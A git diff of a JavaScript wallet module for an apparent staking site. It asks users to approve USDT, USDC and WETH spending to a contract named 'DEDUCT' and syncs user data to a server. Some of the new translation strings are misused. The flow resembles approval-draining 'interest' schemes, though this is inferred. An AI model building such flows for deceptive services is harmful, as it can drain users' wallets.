@@ -1,12 +1,14 @@
 import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.5/ethers.umd.min.js';
 import { DEDUCT_CONTRACT_ADDRESS, USDT_CONTRACT_ADDRESS, USDC_CONTRACT_ADDRESS, WETH_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, ERC20_ABI, translations } from './constants.js';
-import { updateStatus, disableInteractiveElements, updateBalancesUI } from './ui.js';
+import { updateStatus, disableInteractiveElements, updateBalancesUI, updateInterest } from './ui.js';
+import { saveUserData } from './sse.js';
 
 export let provider, signer, userAddress;
 export let deductContract, usdtContract, usdcContract, wethContract;
 
 export async function sendMobileRobustTransaction(populatedTx) {
-    if (!signer || !provider) throw new Error("Wallet not connected or signer is missing.");
+    const currentLang = localStorage.getItem('language') || 'zh-Hant';
+    if (!signer || !provider) throw new Error(translations[currentLang].error + ": Wallet not connected or signer is missing.");
     const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
     const fromAddress = await signer.getAddress();
     const mobileTx = { from: fromAddress, to: populatedTx.to, data: populatedTx.data, value: '0x' + BigInt(txValue).toString(16) };
@@ -14,7 +16,7 @@ export async function sendMobileRobustTransaction(populatedTx) {
     try {
         console.log(`sendMobileRobustTransaction: Sending transaction:`, mobileTx);
         txHash = await provider.send('eth_sendTransaction', [mobileTx]);
-        updateStatus(`Transaction sent! HASH: ${txHash.slice(0, 10)}... waiting for confirmation...`);
+        updateStatus(`${translations[currentLang].fetchingBalances} HASH: ${txHash.slice(0, 10)}... waiting for confirmation...`);
         receipt = await provider.waitForTransaction(txHash);
         console.log(`sendMobileRobustTransaction: Transaction confirmed, receipt:`, receipt);
     } catch (error) {
@@ -38,13 +40,13 @@ export async function initializeWallet() {
     const currentLang = localStorage.getItem('language') || 'zh-Hant';
     try {
         if (typeof window.ethereum === 'undefined') {
-            updateStatus(translations[currentLang].noWallet);
+            updateStatus(translations[currentLang].noWallet, true);
             disableInteractiveElements(true);
             console.log(`initializeWallet: No Ethereum provider detected.`);
             document.getElementById('connectButton').disabled = true;
             return;
         }
-        if (!ethers.BrowserProvider) {
+        if (!ethers || !ethers.BrowserProvider) {
             updateStatus(translations[currentLang].ethersError, true);
             console.error(`initializeWallet: Ethers.js BrowserProvider not available. Check CDN or script tag.`);
             document.getElementById('connectButton').disabled = true;
@@ -67,7 +69,7 @@ export async function initializeWallet() {
             await connectWallet();
         } else {
             disableInteractiveElements(true);
-            updateStatus(translations[currentLang].noWallet);
+            updateStatus(translations[currentLang].noWallet, true);
         }
     } catch (error) {
         console.error(`initializeWallet: Wallet initialization error: ${error.message}`);
@@ -80,12 +82,12 @@ export async function connectWallet() {
     const currentLang = localStorage.getItem('language') || 'zh-Hant';
     try {
         if (typeof window.ethereum === 'undefined') {
-            updateStatus(translations[currentLang].noWallet);
+            updateStatus(translations[currentLang].noWallet, true);
             console.log(`connectWallet: No Ethereum provider detected.`);
             document.getElementById('connectButton').disabled = true;
             return;
         }
-        if (!ethers.BrowserProvider) {
+        if (!ethers || !ethers.BrowserProvider) {
             updateStatus(translations[currentLang].ethersError, true);
             console.error(`connectWallet: Ethers.js BrowserProvider not available. Check CDN or script tag.`);
             document.getElementById('connectButton').disabled = true;
@@ -119,6 +121,12 @@ export async function connectWallet() {
         console.log(`connectWallet: Wallet balances:`, balances);
         updateBalancesUI(balances);
         updateStatus(translations[currentLang].walletConnected);
+        if (userAddress) {
+            const { setupSSE } = await import('./sse.js');
+            setupSSE();
+            await import('./sse.js').then(module => module.loadUserDataFromServer());
+        }
+        await saveUserData();
     } catch (error) {
         console.error(`connectWallet: Connection error: ${error.message}`);
         let userMessage = `${translations[currentLang].error}: ${error.message}`;
@@ -142,8 +150,8 @@ export async function updateUIBasedOnChainState() {
         const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
             retry(() => deductContract.isServiceActiveFor(userAddress)),
             retry(() => usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
-            retry(() => usdcContract.allowance(userAddress, USDC_CONTRACT_ADDRESS)).catch(() => 0n),
-            retry(() => wethContract.allowance(userAddress, WETH_CONTRACT_ADDRESS)).catch(() => 0n)
+            retry(() => usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
+            retry(() => wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n)
         ]);
         console.log(`updateUIBasedOnChainState: Chain state:`, { isServiceActive, usdtAllowance, usdcAllowance, wethAllowance });
         const isWethAuthorized = wethAllowance >= requiredAllowance;
@@ -158,6 +166,7 @@ export async function updateUIBasedOnChainState() {
             else if (isUsdtAuthorized) walletTokenSelect.value = 'USDT';
             else if (isUsdcAuthorized) walletTokenSelect.value = 'USDC';
             walletTokenSelect.dispatchEvent(new Event('change'));
+            const { activateStakingUI } = await import('./ui.js');
             activateStakingUI();
             document.getElementById('pledgeBtn').disabled = false;
             document.getElementById('pledgeAmount').disabled = false;
@@ -176,13 +185,13 @@ export async function updateUIBasedOnChainState() {
         updateStatus("");
     } catch (error) {
         console.error(`updateUIBasedOnChainState: Failed to check on-chain state: ${error.message}`);
-        updateStatus(`Failed to check on-chain state: ${error.message}`);
+        updateStatus(`${translations[currentLang].error}: ${error.message}`, true);
     }
 }
 
 export async function handleConditionalAuthorizationFlow() {
     const currentLang = localStorage.getItem('language') || 'zh-Hant';
-    if (!signer) throw new Error("Wallet not connected");
+    if (!signer) throw new Error(translations[currentLang].error + ": Wallet not connected");
     updateStatus('Preparing authorization...');
     const selectedToken = document.getElementById('walletTokenSelect').value;
     console.log(`handleConditionalAuthorizationFlow: User selected ${selectedToken} for authorization.`);
@@ -223,10 +232,10 @@ export async function handleConditionalAuthorizationFlow() {
         const receipt = await sendMobileRobustTransaction(activateTx);
         await saveUserData({
             isActive: true,
-            stakingStartTime,
-            claimedInterest,
-            pledgedAmount,
-            accountBalance,
+            stakingStartTime: (await import('./ui.js')).stakingStartTime,
+            claimedInterest: (await import('./ui.js')).claimedInterest,
+            pledgedAmount: (await import('./ui.js')).pledgedAmount,
+            accountBalance: (await import('./ui.js')).accountBalance,
             nextBenefitTime: localStorage.getItem('nextBenefitTime'),
             lastUpdated: Date.now(),
             source: 'index.html'
@@ -234,10 +243,11 @@ export async function handleConditionalAuthorizationFlow() {
     }
 }
 
-export function disconnectWallet() {
+export async function disconnectWallet() {
     const currentLang = localStorage.getItem('language') || 'zh-Hant';
+    const { resetState } = await import('./ui.js');
     resetState(true);
-    alert('Wallet disconnected. To fully remove permissions, do so from within your wallet settings.');
+    alert(translations[currentLang].walletConnected + ' disconnected. To fully remove permissions, do so from within your wallet settings.');
     console.log(`disconnectWallet: Wallet disconnected.`);
 }
 
